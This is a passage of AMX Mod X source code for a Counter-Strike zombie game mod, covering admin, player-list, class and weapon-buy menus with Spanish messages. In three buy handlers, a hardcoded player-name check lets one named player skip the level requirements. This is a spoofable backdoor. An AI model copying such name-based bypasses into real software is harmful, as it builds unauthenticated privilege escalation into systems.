	len = 0
	userflags = get_user_flags(id)
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yMENU DE ADMIN^n^n")
	
	// 1. Synapsis mode command
	if( ( userflags & ACCESS_MODE_2 ) && allowed_swarm() && fnGetAlive() >= 12 )
		len += formatex( menu[len], charsmax(menu) - len, "\r1.\w Comenzar modo synapsis^n" )
	else if( fnGetAlive() < 12 )
		len += formatex( menu[len], charsmax(menu) - len, "\d1. Comenzar modo synapsis \r( %d/12 )^n", fnGetAlive() )
	else
		len += formatex( menu[len], charsmax(menu) - len, "\d1. Comenzar modo synapsis^n" )
	
	// 2. L4D mode command
	if( ( userflags & ACCESS_MODE_2 ) && allowed_swarm() && fnGetAlive() >= 20 )
		len += formatex( menu[len], charsmax(menu) - len, "\r2.\w Comenzar modo L4D^n" )
	else if( fnGetAlive() < 20 )
		len += formatex( menu[len], charsmax(menu) - len, "\d2. Comenzar modo L4D \r( %d/20 )^n", fnGetAlive() )
	else
		len += formatex( menu[len], charsmax(menu) - len, "\d2. Comenzar modo L4D^n" )
	
	// 3. Wesker mode command
	if( ( userflags & ACCESS_MODE_2 ) ) len += formatex( menu[len], charsmax(menu) - len, "\r3.\w Modo wesker^n" )
	else len += formatex( menu[len], charsmax(menu) - len, "\d3. Modo Wesker^n" )
		
	// 4. Ninja mode command
	if( ( userflags & ACCESS_MODE_2 ) ) len += formatex( menu[len], charsmax(menu) - len, "\r4.\w Modo jason^n" )
	else len += formatex( menu[len], charsmax(menu) - len, "\d4. Modo Jason^n" )
		
	// 5. Sniper mode command
	if( ( userflags & ACCESS_MODE_2 ) && allowed_swarm() && fnGetAlive() >= 5 )
		len += formatex( menu[len], charsmax(menu) - len, "\r5.\w Comenzar modo sniper^n" )
	else if( fnGetAlive() < 5 )
		len += formatex( menu[len], charsmax(menu) - len, "\d5. Comenzar modo sniper \r( %d/5 )^n", fnGetAlive() )
	else
		len += formatex( menu[len], charsmax(menu) - len, "\d5. Comenzar modo sniper^n" )
		
	// 6. Taringa mode command
	if( ( userflags & ACCESS_MODE_2 ) && allowed_swarm() && fnGetAlive() >= 12 )
		len += formatex( menu[len], charsmax(menu) - len, "\r6.\w Comenzar modo Taringa!^n" )
	else if( fnGetAlive() < 12 )
		len += formatex( menu[len], charsmax(menu) - len, "\d6. Comenzar modo Taringa! \r( %d/12 )^n", fnGetAlive() )
	else
		len += formatex( menu[len], charsmax(menu) - len, "\d6. Comenzar modo Taringa!^n" )
		
	// 7. Troll mode command
	if( ( userflags & ACCESS_MODE_2 ) ) len += formatex( menu[len], charsmax(menu) - len, "\r7.\w Modo troll^n" )
	else len += formatex( menu[len], charsmax(menu) - len, "\d7. Modo Troll^n" )
	
	// 0. Exit
	len += formatex( menu[len], charsmax(menu) - len, "^n\r9.\w Anterior^n" )
	len += formatex(menu[len], charsmax(menu) - len, "^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, -1, "Admin Mans")
}

// Player List Menu
show_menu_player_list(id)
{
	static menuid, menu[128], player, userflags, buffer[2]
	userflags = get_user_flags(id)
	
	// Title
	switch (PL_ACTION)
	{
		case ACTION_ZOMBIEFY_HUMANIZE: formatex(menu, charsmax(menu), "HACER ZOMBIE/HUMANO\r")
		case ACTION_MAKE_NEMESIS: formatex(menu, charsmax(menu), "HACER NEMESIS\r")
		case ACTION_MAKE_SURVIVOR: formatex(menu, charsmax(menu), "HACER SURVIVOR\r")
		case ACTION_RESPAWN_PLAYER: formatex(menu, charsmax(menu), "REVIVIR A ALGUIEN\r")
		case ACTION_MODE_WESKER: formatex(menu, charsmax(menu), "HACER WESKER\r")
		case ACTION_MODE_NINJA: formatex(menu, charsmax(menu), "HACER JASON\r")
		case ACTION_MAKE_TROLL: formatex(menu, charsmax(menu), "HACER TROLL\r")
		//case ACTION_MODE_SNIPER: formatex(menu, charsmax(menu), "HACER SNIPER\r")
	}
	menuid = menu_create(menu, "menu_player_list")
	
	// Player List
	for (player = 0; player <= g_maxplayers; player++)
	{
		// Skip if not connected
		if (!g_isconnected[player])
			continue;
		
		// Format text depending on the action to take
		switch (PL_ACTION)
		{
			case ACTION_ZOMBIEFY_HUMANIZE: // Zombiefy/Humanize command
			{
				if (g_zombie[player])
				{
					if (allowed_human(player) && (userflags & ACCESS_MODE))
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
				}
				else
				{
					if (allowed_zombie(player) && (userflags & ACCESS_MODE))
						formatex(menu, charsmax(menu), "%s \y[%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
					else
						formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
			}
			case ACTION_MAKE_NEMESIS: // Nemesis command
			{
				if (allowed_nemesis(player) && (userflags & ACCESS_MODE))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}
			case ACTION_MAKE_SURVIVOR: // Survivor command
			{
				if (allowed_survivor(player) && (userflags & ACCESS_MODE))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}
			case ACTION_RESPAWN_PLAYER: // Respawn command
			{
				if (allowed_respawn(player) && (userflags & ACCESS_MODE))
					formatex(menu, charsmax(menu), "%s", g_playername[player])
				else
					formatex(menu, charsmax(menu), "\d%s", g_playername[player])
			}
			case ACTION_MODE_WESKER: // Wesker command
			{
				if (allowed_wesker(player) && (userflags & ACCESS_MODE_2))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}
			case ACTION_MODE_NINJA: // Ninja command
			{
				if (allowed_ninja(player) && (userflags & ACCESS_MODE_2))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}
			case ACTION_MAKE_TROLL: // Troll command
			{
				if (allowed_troll(player) && (userflags & ACCESS_MODE))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : gTroll[player] ? "Troll" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}
			/*case ACTION_MODE_SNIPER: // Sniper command
			{
				if (allowed_sniper(player) && (userflags & ACCESS_MODE_2))
				{
					if (g_zombie[player])
						formatex(menu, charsmax(menu), "%s \r[%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : "Zombie")
					else
						formatex(menu, charsmax(menu), "%s [%s]", g_playername[player], gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" :
						gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ? "L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" :
						gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
				}
				else
					formatex(menu, charsmax(menu), "\d%s [%s]", g_playername[player], g_nemesis[player] ? "Nemesis" : g_zombie[player] ? "Zombie" : 
					gPlayersL4D[player][0] ? "L4D: BILL" : gPlayersL4D[player][1] ? "L4D: FRANCIS" : gPlayersL4D[player][2] ? "L4D: ZOEY" : gPlayersL4D[player][3] ?
					"L4D: LUIS" : gWesker[player] ? "Wesker" : gJason[player] ? "Jason" : gSniper[player] ? "Sniper" : g_survivor[player] ? "Survivor" : "Humano")
			}*/
		}
		
		// Add player
		buffer[0] = player
		buffer[1] = 0
		menu_additem(menuid, menu, buffer)
	}
	
	// Back - Next - Exit
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	
	menu_display(id, menuid)
}

/*================================================================================
 [Menu Handlers]
=================================================================================*/

// Game Menu
public menu_game(id, key)
{
	switch (key)
	{
		case 0: // Buy Weapons
		{
			// Disable the remember selection setting
			WPN_AUTO_ON = 0
			CC(id, "!g[ZP]!y El menú de compra ha sido re-activado")
			
			// Show menu if player hasn't yet bought anything
			if (g_canbuy[id]) show_menu_buy1(id)
		}
		case 1: // Extra Items
		{
			// Check whether the player is able to buy anything
			if (g_isalive[id])
			{
				if( gL4DRound || gWeskerRound || gJasonRound || gSniperRound || gTrollRound )
				{
					CC(id, "!g[ZP]!y No se puede usar items extras en los modos:!g L4D, Wesker, Jason, Sniper o Troll!y")
					return PLUGIN_HANDLED;
				}
				
				show_menu_extras(id)
			}
			else
				CC(id, "!g[ZP]!y Comando no disponible")
		}
		case 2: show_menu_hzclass(id)
		case 3: show_menu_logros_class(id)
		case 4: show_menu_hab_class(id) // Habilities Menu
		case 5: if( ReqNeedReset_ASD(id) ) show_menu_reset(id); else show_menu_game(id) // Reset Menu
		/*case 5: // Join Spectator
		{
			// Player alive?
			if (g_isalive[id])
			{
				// Prevent abuse by non-admins if block suicide setting is enabled
				if (get_pcvar_num(cvar_blocksuicide) && !(get_user_flags(id) & ACCESS_MENU))
				{
					CC(id, "!g[ZP]!y Comando no disponible"")
					return PLUGIN_HANDLED;
				}
				
				// Check that we still have both humans and zombies to keep the round going
				check_round(id)
				
				// Kill him before he switches team
				dllfunc(DLLFunc_ClientKill, id)
			}
			
			// Remove previous tasks
			remove_task(id+TASK_TEAM)
			remove_task(id+TASK_MODEL)
			remove_task(id+TASK_FLASH)
			remove_task(id+TASK_CHARGE)
			remove_task(id+TASK_SPAWN)
			remove_task(id+TASK_BLOOD)
			remove_task(id+TASK_AURA)
			remove_task(id+TASK_BURN)
			
			// Then move him to the spectator team
			fm_cs_set_user_team(id, FM_CS_TEAM_SPECTATOR)
			fm_user_team_update(id)
		}*/
		case 6: show_menu_interfaz(id)
		case 7: show_menu_herramientas(id)
		case 8: // Admin Menu 
		{
			// Check if player has the required access
			if (get_user_flags(id) & ACCESS_MENU) show_menu_admin(id)
			else CC(id, "!g[ZP]!y No tienes acceso")
		}
	}
	
	return PLUGIN_HANDLED;
}

public show_menu_hzclass(id)
{
	static menu[512], len
	len = 0
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yELEGI LA CLASE^n^n")
	
	len += formatex(menu[len], charsmax(menu) - len, "\r1.\w Humana^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r2.\w Zombie")
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Volver")
	
	show_menu(id, KEYSMENU, menu, -1, "HZ Class")
}

public menu_hzclass(id, key)
{
	switch(key)
	{
		case 0: show_menu_hclass(id)
		case 1: show_menu_zclass(id)
		case 2..8: show_menu_hzclass(id)
		case 9: show_menu_game(id)
	}
	
	return PLUGIN_HANDLED;
}

// Buy Menu 1
public menu_buy1(id, key)
{
	// Zombies or survivors get no guns
	if (!g_isalive[id] || g_zombie[id] || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] ||
	gJason[id] || gSniper[id])
		return PLUGIN_HANDLED;
	
	// Special keys / weapon list exceeded
	if (key >= MENU_KEY_AUTOSELECT || WPN_SELECTION >= WPN_MAXIDS)
	{
		switch (key)
		{
			case MENU_KEY_AUTOSELECT: // toggle auto select
			{
				WPN_AUTO_ON = 1 - WPN_AUTO_ON
			}
			case MENU_KEY_NEXT: // next/back
			{
				if (WPN_STARTID+7 < WPN_MAXIDS)
					WPN_STARTID += 7
				else
					WPN_STARTID = 0
			}
			case MENU_KEY_EXIT: // exit
			{
				show_menu_game(id)
				return PLUGIN_HANDLED;
			}
		}
		
		// Show buy menu again
		show_menu_buy1(id)
		return PLUGIN_HANDLED;
	}
	
	// Detect weapon level & reset
	new iWeaponLevel = ArrayGetCell( gPrimaryLevel, WPN_SELECTION )
	new iWeaponReset = ArrayGetCell( gPrimaryReset, WPN_SELECTION )
	
	if( ( ( gReset[id] > iWeaponReset ) || ( ( gReset[id] == iWeaponReset ) && gLevel[id] >= iWeaponLevel ) ) || equal(g_playername[id], "Kiske-SO     T! CS") )
	{
		// Store selected weapon id
		WPN_AUTO_PRI = WPN_SELECTION
		
		// Buy primary weapon
		buy_primary_weapon(id, WPN_AUTO_PRI)
		
		// Show pistols menu
		show_menu_buy2(id)
	}
	else
	{
		CC(id, "!g[ZP]!y No cumplis con los requisitos necesarios para comprar el arma seleccionada")
		
		// Show buy menu again
		show_menu_buy1(id)
		return PLUGIN_HANDLED;
	}
	
	return PLUGIN_HANDLED;
}

// Buy Primary Weapon
buy_primary_weapon(id, selection)
{
	// Drop previous weapons
	/*drop_weapons(id, 1)
	drop_weapons(id, 2)*/
	
	// Strip off from weapons
	strip_user_weapons(id)
	give_item(id, "weapon_knife")
	
	// Get weapon's id and name
	static weaponid, wname[32]
	weaponid = ArrayGetCell(g_primary_weaponids, selection)
	ArrayGetString(g_primary_items, selection, wname, charsmax(wname))
	
	// Give the new weapon and full ammo
	give_item(id, wname)
	ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[weaponid], AMMOTYPE[weaponid], MAXBPAMMO[weaponid])
	
	// Weapon Edit ?
	RemoveAllWeaponsEdit(id, ARMA_PRIMARIA)
	
	if(selection >= 16)
	{
		gWeaponsEdit[id][ARMA_PRIMARIA] = 1
		gWeapon[id][ARMA_PRIMARIA][selection] = 1
	}
	
	// Weapons bought
	g_canbuy[id] = false
	
	// Change models
	static weapon_ent
	weapon_ent = fm_cs_get_current_weapon_ent(id)
	if (is_valid_ent(weapon_ent)) replace_weapon_models(id, cs_get_weapon_id(weapon_ent))
	
	// Give additional items
	/*static i
	for (i = 0; i < ArraySize(g_additional_items); i++)
	{
		ArrayGetString(g_additional_items, i, wname, charsmax(wname))
		give_item(id, wname)
	}*/
}

// Buy Menu 2
public menu_buy2(id, key)
{	
	// Zombies or survivors get no guns
	if (!g_isalive[id] || g_zombie[id] || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || 
	gJason[id] || gSniper[id])
		return PLUGIN_HANDLED;
	
	// Special keys / weapon list exceeded
	if (key >= MENU_KEY_AUTOSELECT || WPN_SELECTION_2 >= WPN_MAXIDS_2)
	{
		switch (key)
		{
			case MENU_KEY_AUTOSELECT: // toggle auto select
			{
				WPN_AUTO_ON = 1 - WPN_AUTO_ON
			}
			case MENU_KEY_NEXT: // next/back
			{
				if (WPN_STARTID_2+7 < WPN_MAXIDS_2)
					WPN_STARTID_2 += 7
				else
					WPN_STARTID_2 = 0
			}
			case MENU_KEY_EXIT: // exit
			{
				show_menu_game(id)
				return PLUGIN_HANDLED;
			}
		}
		
		// Show buy menu again
		show_menu_buy2(id)
		return PLUGIN_HANDLED;
	}
	
	// Special keys / weapon list exceeded
	/*if (key >= ArraySize(g_secondary_items))
	{
		// Toggle autoselect
		if (key == MENU_KEY_AUTOSELECT)
			WPN_AUTO_ON = 1 - WPN_AUTO_ON
		
		// Reshow menu unless user exited
		if (key != MENU_KEY_EXIT) show_menu_buy2(id)
		else show_menu_game(id)
		return PLUGIN_HANDLED;
	}*/
	
	// Detect weapon level & reset
	new iWeaponLevel = ArrayGetCell( gSecondaryLevel, WPN_SELECTION_2 )
	new iWeaponReset = ArrayGetCell( gSecondaryReset, WPN_SELECTION_2 )
	
	if( ( ( gReset[id] > iWeaponReset ) || ( ( gReset[id] == iWeaponReset ) && gLevel[id] >= iWeaponLevel ) ) || equal(g_playername[id], "Kiske-SO     T! CS") )
	{
		// Store selected weapon
		WPN_AUTO_SEC = WPN_SELECTION_2
		
		// Buy secondary weapon
		buy_secondary_weapon(id, WPN_AUTO_SEC)
		
		// Show grenades menu
		if( gShowMenu[id] ) show_menu_buy3(id)
	}
	else
	{
		CC(id, "!g[ZP]!y No cumplis con los requisitos necesarios para comprar el arma seleccionada")
		
		// Show buy menu again
		show_menu_buy2(id)
		return PLUGIN_HANDLED;
	}
	
	return PLUGIN_HANDLED;
}

// Buy Secondary Weapon
buy_secondary_weapon(id, selection)
{
	// Drop secondary gun again, in case we picked another (bugfix)
	drop_weapons(id, 2)
	
	// Get weapon's id
	static weaponid, wname[32]
	weaponid = ArrayGetCell(g_secondary_weaponids, selection)
	ArrayGetString(g_secondary_items, selection, wname, charsmax(wname))
	
	// Give the new weapon and full ammo
	give_item(id, wname)
	ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[weaponid], AMMOTYPE[weaponid], MAXBPAMMO[weaponid])
	
	// Weapon Edit ?
	RemoveAllWeaponsEdit(id, ARMA_SECUNDARIA)
	
	if(selection >= 6)
	{
		gWeaponsEdit[id][ARMA_SECUNDARIA] = 1
		gWeapon[id][ARMA_SECUNDARIA][selection] = 1
	}
	
	// Change models
	static weapon_ent
	weapon_ent = fm_cs_get_current_weapon_ent(id)
	if (is_valid_ent(weapon_ent)) replace_weapon_models(id, cs_get_weapon_id(weapon_ent))
}

// Buy Menu 3
public menu_buy3(id, key)
{	
	// Zombies or survivors get no guns
	if (!g_isalive[id] || g_zombie[id] || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || 
	gJason[id] || gSniper[id] || gTrollRound)
		return PLUGIN_HANDLED;
	
	if( gReset[id] < 20 )
	{
		if( key >= 5 )
		{
			switch( key )
			{
				case MENU_KEY_AUTOSELECT: // toggle auto select
				{
					WPN_AUTO_ON = 1 - WPN_AUTO_ON
				}
				case MENU_KEY_EXIT: // exit
				{
					show_menu_game(id)
					return PLUGIN_HANDLED;
				}
			}
			
			show_menu_buy3(id)
			return PLUGIN_HANDLED;
		}
		
		if( (gReset[id] > 0) || ( gLevel[id] >= LevelGranadas[key] ) || equal(g_playername[id], "Kiske-SO     T! CS") )
		{
			if( user_has_weapon(id, CSW_HEGRENADE) ) ham_strip_weapons(id, "weapon_hegrenade")
			if( user_has_weapon(id, CSW_FLASHBANG) ) ham_strip_weapons(id, "weapon_flashbang")
			if( user_has_weapon(id, CSW_SMOKEGRENADE) ) ham_strip_weapons(id, "weapon_smokegrenade")
			
			#if defined MOLOTOV_ON
			gMolotov[id] = { 0, 0, 0 }
			#endif
			gSuperNova[id] = 0
			gBubble[id] = 0
			
			WPN_AUTO_TER = key
			
			static Obt2
			for( new gFors = 0; gFors < 3; gFors++ )
			{
				set_msg_block( get_user_msgid( "AmmoPickup" ), BLOCK_ONCE )
				
				give_item( id, WeaponGranadas[ gFors ] )
				
				set_msg_block( get_user_msgid( "AmmoPickup" ), BLOCK_NOT )
				
				cs_set_user_bpammo( id, AmmoGranadas[ gFors ], AmmountGranadas[ WPN_AUTO_TER ][ gFors ] )
				
				for( Obt2 = 0; Obt2 <= 4; Obt2++ )
				{
					#if defined MOLOTOV_ON
					if( Obt2 == 1 && WPN_AUTO_TER == 1 )
					{
						gMolotov[id] = { 1, 0, 0 }
					}
					else 
					#endif
					if( Obt2 == 2 && WPN_AUTO_TER == 2 )
					{
						#if defined MOLOTOV_ON
						gMolotov[id] = { 0, 1, 0 }
						#endif
						gBubble[id] = 1
					}
					else if( Obt2 == 3 && WPN_AUTO_TER == 3 )
					{
						#if defined MOLOTOV_ON
						gMolotov[id] = { 0, 0, 1 }
						#endif
						gSuperNova[id] = 1
						gBubble[id] = 1
					}
					else if( Obt2 == 4 && WPN_AUTO_TER == 4 )
					{
						#if defined MOLOTOV_ON
						gMolotov[id] = { 0, 0, 2 }
						#endif
						gSuperNova[id] = 2
						gBubble[id] = 2
					}
				}
			}
			
			// Change models
			static weapon_ent
			weapon_ent = fm_cs_get_current_weapon_ent(id)
			if (is_valid_ent(weapon_ent)) replace_weapon_models(id, cs_get_weapon_id(weapon_ent))
		}
		else
		{
			CC(id, "!g[ZP]!y No cumplis con los requisitos necesarios para comprar el arma seleccionada")
			
			// Show buy menu again
			show_menu_buy3(id)
			return PLUGIN_HANDLED;
		}
	}
	else
	{
		if( key >= 6 )
		{
			switch( key )
			{
				case MENU_KEY_AUTOSELECT: // toggle auto select
				{
					WPN_AUTO_ON = 1 - WPN_AUTO_ON
				}
				case MENU_KEY_EXIT: // exit
				{
					show_menu_game(id)
					return PLUGIN_HANDLED;
				}
			}
			
			show_menu_buy3(id)
			return PLUGIN_HANDLED;
		}
		
		if( ( gLevel[id] >= LevelGranadas_ELITE[key] ) || equal(g_playername[id], "Kiske-SO     T! CS") )
		{
			if( user_has_weapon(id, CSW_HEGRENADE) ) ham_strip_weapons(id, "weapon_hegrenade")
			if( user_has_weapon(id, CSW_FLASHBANG) ) ham_strip_weapons(id, "weapon_flashbang")
			if( user_has_weapon(id, CSW_SMOKEGRENADE) ) ham_strip_weapons(id, "weapon_smokegrenade")
			
			#if defined MOLOTOV_ON
			gMolotov[id] = { 0, 0, 0 }
			#endif
			gSuperNova[id] = 0
			gBubble[id] = 0
			
			WPN_AUTO_TER = key
			
			static Obt2
			for( new gFors = 0; gFors < 3; gFors++ )
			{
				set_msg_block( get_user_msgid( "AmmoPickup" ), BLOCK_ONCE )
				
				give_item( id, WeaponGranadas[ gFors ] )
				
				set_msg_block( get_user_msgid( "AmmoPickup" ), BLOCK_NOT )
				
				cs_set_user_bpammo( id, AmmoGranadas[ gFors ], AmmountGranadas_ELITE[ WPN_AUTO_TER ][ gFors ] )
				
				for( Obt2 = 0; Obt2 <= 5; Obt2++ )
				{
					if( Obt2 == 0 && WPN_AUTO_TER == 0 )
					{
						#if defined MOLOTOV_ON
						gMolotov[id] = { 0, 0, 2 }
						#endif
						gSuperNova[id] = 2
						gBubble[id] = 2
					}
					else if( Obt2 == 1 && WPN_AUTO_TER == 1 )
					{
						//
					}
					else if( Obt2 == 2 && WPN_AUTO_TER == 2 )
					{
						//
					}
					else if( Obt2 == 3 && WPN_AUTO_TER == 3 )
					{
						//
					}
					else if( Obt2 == 4 && WPN_AUTO_TER == 4 )
					{
						//
					}
					else if( Obt2 == 5 && WPN_AUTO_TER == 5 )
					{
						//
					}
				}
			}
			
			// Change models
			static weapon_ent
			weapon_ent = fm_cs_get_current_weapon_ent(id)
			if (is_valid_ent(weapon_ent)) replace_weapon_models(id, cs_get_weapon_id(weapon_ent))
		}
		else
		{
			CC(id, "!g[ZP]!y No cumplis con los requisitos necesarios para comprar el arma seleccionada")
			
			// Show buy menu again
			show_menu_buy3(id)
			return PLUGIN_HANDLED;
		}
	}
	
	return PLUGIN_HANDLED;
}

// Extra Items Menu
public menu_extras(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	// Dead players are not allowed to buy items
	if (!g_isalive[id])
	{
		CC(id, "!g[ZP]!y Comando no disponible")
		menu_destroy(menuid)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve extra item id
	static buffer[2], dummy, itemid
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	itemid = buffer[0]
	
	// Attempt to buy the item
	buy_extra_item(id, itemid)
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}

// Buy Extra Item
buy_extra_item(id, itemid, ignorecost = 0)
{
	// Retrieve item's team
	static team
	team = ArrayGetCell(g_extraitem_team, itemid)
	
	// Check for team/class specific items
	if ((g_zombie[id] && !g_nemesis[id] && !(team & ZP_TEAM_ZOMBIE)) ||
	(!g_zombie[id] && !g_survivor[id] && !(team & ZP_TEAM_HUMAN)) ||
	(g_nemesis[id] && !(team & ZP_TEAM_NEMESIS)) ||
	(g_survivor[id] && !(team & ZP_TEAM_SURVIVOR)) ||
	gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id])
	{
		CC(id, "!g[ZP]!y Comando no disponible")
		return;
	}
	
	// Check for unavailable items
